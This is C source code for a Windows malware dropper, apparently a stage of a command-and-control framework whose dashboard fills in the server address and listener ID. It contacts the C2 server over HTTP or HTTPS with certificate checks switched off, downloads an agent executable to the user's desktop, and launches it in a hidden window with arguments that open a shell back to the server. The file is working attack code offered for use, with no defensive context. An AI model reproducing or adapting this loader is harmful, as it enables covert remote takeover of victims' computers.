#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <shlobj.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

// THESE VALUES WILL BE REPLACED BY THE DASHBOARD
#define C2_SERVER L"__SERVER_IP__"
#define C2_PORT 8000
#define C2_PROTOCOL L"http"
#define LISTENER_ID L"__LISTENER_ID__"

BOOL DownloadFile(const wchar_t* url, const wchar_t* output_path) {
    HINTERNET hSession = WinHttpOpen(L"Dropper/1.0", 0, NULL, NULL, 0);
    if (!hSession) return FALSE;
    
    HINTERNET hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    DWORD flags = (wcscmp(C2_PROTOCOL, L"https") == 0) ? WINHTTP_FLAG_SECURE : 0;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url, NULL, NULL, NULL, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    if (flags == WINHTTP_FLAG_SECURE) {
        DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                               SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                               SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &security_flags, sizeof(security_flags));
    }
    
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    HANDLE hFile = CreateFileW(output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    DWORD bytes_read = 0;
    BYTE buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
        DWORD bytes_written;
        WriteFile(hFile, buffer, bytes_read, &bytes_written, NULL);
    }
    
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return TRUE;
}

BOOL ExecuteAndWait(const wchar_t* exe_path) {
    wchar_t cmd_line[1024];
    wsprintfW(cmd_line, 
              L"\"%s\" --shell --server %s://%s:%d --listener %s",
              exe_path, C2_PROTOCOL, C2_SERVER, C2_PORT, LISTENER_ID);
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessW(NULL, cmd_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    wchar_t agent_path[MAX_PATH];
    wchar_t desktop_path[MAX_PATH];
    
    if (SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) != S_OK) {
        wcscpy(desktop_path, L"C:\\Users\\Public\\Desktop");
    }
    
    wcscpy(agent_path, desktop_path);
    wcscat(agent_path, L"\\MyAgent.exe");
    
    if (!DownloadFile(L"/static/MyAgent.exe", agent_path)) return 1;
    if (!ExecuteAndWait(agent_path)) return 1;
    
    return 0;
}